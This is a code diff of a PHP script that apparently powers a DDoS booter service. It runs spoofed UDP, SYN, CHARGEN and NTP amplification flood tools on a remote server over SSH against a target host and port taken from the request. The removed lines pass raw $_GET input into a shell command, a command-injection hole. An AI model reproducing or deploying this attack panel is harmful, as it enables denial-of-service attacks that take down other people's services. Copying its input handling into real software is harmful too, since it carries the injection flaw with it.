@@ -47,7 +47,7 @@ else
     {
     	if($method == "UDP" || $method == "udp")
     	{
-	        if(!($stream = ssh2_exec($con, "/root/spoof ".$_GET['host']." ".$_GET['port']." ".$_GET['list']." ".ATTACK_THREADS." ".$_GET['time']))) die("Command couldn't be executed, something went wrong...\n");
+	        if(!($stream = ssh2_exec($con, "/root/spoof ".$host." ".$port." ".$list." ".ATTACK_THREADS." ".$time))) die("Command couldn't be executed, something went wrong...\n");
 	        else
 	        {
 	            echo "" . stream_get_contents($stream);
@@ -56,7 +56,7 @@ else
 	    }
 	    elseif($method == "ESSYN" || $method == "essyn")
     	{
-	        if(!($stream = ssh2_exec($con, "/root/essyn ".$_GET['host']." ".$_GET['port']." ".$_GET['list']." ".$_GET['time']))) die("Command couldn't be executed, something went wrong...\n");
+	        if(!($stream = ssh2_exec($con, "/root/essyn ".$host." ".$port." ".$list." ".$time))) die("Command couldn't be executed, something went wrong...\n");
 	        else
 	        {
 	            echo "" . stream_get_contents($stream);
@@ -65,7 +65,7 @@ else
 	    }
 	    elseif($method == "CHARGEN" || $method == "chargen")
     	{
-	        if(!($stream = ssh2_exec($con, "/root/chargen ".$_GET['host']." ".$_GET['port']." ".$_GET['list']." ".ATTACK_THREADS." ".$_GET['time']))) die("Command couldn't be executed, something went wrong...\n");
+	        if(!($stream = ssh2_exec($con, "/root/chargen ".$host." ".$port." ".$list." ".ATTACK_THREADS." ".$time))) die("Command couldn't be executed, something went wrong...\n");
 	        else
 	        {
 	            echo "" . stream_get_contents($stream);
@@ -74,7 +74,7 @@ else
 	    }
 	    elseif($method == "NTP" || $method == "ntp")
     	{
-	        if(!($stream = ssh2_exec($con, "/root/ntp ".$_GET['host']." ".$_GET['port']." ".$_GET['list']." ".ATTACK_THREADS." -1 ".$_GET['time']))) die("Command couldn't be executed, something went wrong...\n");
+	        if(!($stream = ssh2_exec($con, "/root/ntp ".$host." ".$port." ".$list." ".ATTACK_THREADS." -1 ".$time))) die("Command couldn't be executed, something went wrong...\n");
 	        else
 	        {
 	            echo "" . stream_get_contents($stream);
